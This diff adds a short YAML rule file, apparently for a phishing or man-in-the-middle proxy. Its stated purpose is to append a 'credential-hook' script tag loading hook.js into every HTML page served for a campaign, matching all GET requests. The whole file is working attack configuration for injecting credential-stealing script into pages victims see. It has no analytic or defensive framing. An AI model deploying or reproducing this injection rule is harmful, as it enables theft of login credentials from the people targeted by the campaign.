@@ -1,0 +1,13 @@
+metadata:
+  title: Inject Hook Script
+  description: Appends a credential-hook script to every HTML page. The script path uses the campaign's static prefix.
+  author: dropoutjeep
+
+rules:
+  - url: "/"
+    match: prefix
+    methods: ["GET"]
+    replace:
+      response:
+        body:
+          append: "<script src='/proxy/static/{{ .Static }}hook.js'></script>"
